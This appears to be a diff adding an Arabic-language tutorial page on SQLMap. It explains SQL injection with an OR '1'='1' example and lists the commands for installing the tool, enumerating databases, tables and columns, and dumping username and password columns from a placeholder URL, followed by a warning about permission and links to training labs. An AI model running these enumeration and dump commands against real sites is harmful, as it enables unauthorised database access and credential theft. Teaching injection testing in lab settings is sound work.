@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQLMap | MT ERO</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <header><div class="logo">MT <span>| ERO</span></div><nav><ul><li><a href="../index.html">الرئيسية</a></li><li><a href="../index.html#tools">الأدوات</a></li></ul></nav></header>
+    <div class="tool-page">
+        <a href="../index.html#tools" class="back-btn"><i class="fas fa-arrow-right"></i> رجوع للأدوات</a>
+        <div class="tool-header">
+            <span class="tool-icon-big"><i class="fas fa-database"></i></span>
+            <h1>SQLMap</h1>
+            <p>أداة كشف واستغلال ثغرات SQL Injection</p>
+        </div>
+        <div class="tool-content">
+            <h2><i class="fas fa-book"></i> يعني إيه SQLMap؟</h2>
+            <p>SQLMap هي أداة مفتوحة المصدر بتكشف ثغرات SQL Injection في المواقع. لو الموقع فيه ثغرة، SQLMap تقدر تستغلها وتوصل لقاعدة البيانات.</p>
+
+            <h3><i class="fas fa-question-circle"></i> يعني إيه SQL Injection؟</h3>
+            <p>لما الموقع بياخد بيانات من المستخدم وبيحطها في استعلام SQL من غير تأمين، المهاجم يقدر يحقن أوامر SQL تخلية يطلع بيانات مش المفروض يشوفها.</p>
+
+            <div class="code-block" data-lang="SQL"><code><span class="comment"># استعلام عادي</span>
+SELECT * FROM users WHERE id = '1'
+
+<span class="comment"># استعلام مخترق</span>
+SELECT * FROM users WHERE id = '1' OR '1'='1'</code></div>
+
+            <h2><i class="fas fa-cog"></i> التثبيت</h2>
+            <div class="code-block" data-lang="Termux"><code>pip install sqlmap
+sqlmap --version</code></div>
+
+            <h2><i class="fas fa-bullseye"></i> الأوامر الأساسية</h2>
+
+            <h3>1. فحص رابط</h3>
+            <div class="code-block" data-lang="Bash"><code>sqlmap -u "http://example.com/page.php?id=1"</code></div>
+
+            <h3>2. فحص مع Cookie</h3>
+            <div class="code-block" data-lang="Bash"><code>sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abc123"</code></div>
+
+            <h3>3. استخراج قواعد البيانات</h3>
+            <div class="code-block" data-lang="Bash"><code>sqlmap -u "http://example.com/page.php?id=1" --dbs</code></div>
+
+            <h3>4. استخراج الجداول</h3>
+            <div class="code-block" data-lang="Bash"><code>sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables</code></div>
+
+            <h3>5. استخراج الأعمدة</h3>
+            <div class="code-block" data-lang="Bash"><code>sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users --columns</code></div>
+
+            <h3>6. استخراج البيانات</h3>
+            <div class="code-block" data-lang="Bash"><code>sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users -C username,password --dump</code></div>
+
+            <h2><i class="fas fa-list"></i> الخيارات المهمة</h2>
+            <ul>
+                <li><strong>-u:</strong> الرابط</li>
+                <li><strong>--dbs:</strong> عرض قواعد البيانات</li>
+                <li><strong>--tables:</strong> عرض الجداول</li>
+                <li><strong>--columns:</strong> عرض الأعمدة</li>
+                <li><strong>--dump:</strong> استخراج البيانات</li>
+                <li><strong>--batch:</strong> موافقة تلقائية</li>
+                <li><strong>--level:</strong> مستوى الفحص (1-5)</li>
+                <li><strong>--risk:</strong> مستوى المخاطرة (1-3)</li>
+            </ul>
+
+            <div class="info-box danger"><strong><i class="fas fa-exclamation-triangle"></i> خطر:</strong> SQLMap بتلمس السيرفر بشكل واضح. متستخدمهاش على أي موقع مش بتاعك أو مش بإذن.</div>
+
+            <h2><i class="fas fa-dumbbell"></i> تمارين</h2>
+            <ol>
+                <li>سجّل في TryHackMe وادخل SQL Injection room</li>
+                <li>استخدم DVWA (Damn Vulnerable Web App)</li>
+                <li>جرب SQLMap على بيئة تدريب</li>
+            </ol>
+
+            <h2><i class="fas fa-link"></i> مصادر</h2>
+            <ul>
+                <li><a href="https://tryhackme.com/room/sqlinjectionlm" target="_blank" style="color: #00d4ff;">TryHackMe SQL Injection</a></li>
+                <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank" style="color: #00d4ff;">PortSwigger SQL Injection</a></li>
+                <li><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" style="color: #00d4ff;">SQLMap GitHub</a></li>
+            </ul>
+        </div>
+    </div>
+    <footer><div class="footer-content"><div class="footer-logo">MT ERO</div><p class="copyright">© 2025 MT ERO.</p></div></footer>
+    <a href="https://t.me/Mozex_3" target="_blank" class="telegram-float"><i class="fab fa-telegram"></i></a>
+    <script src="../js/main.js"></script>
+</body>
+</html>
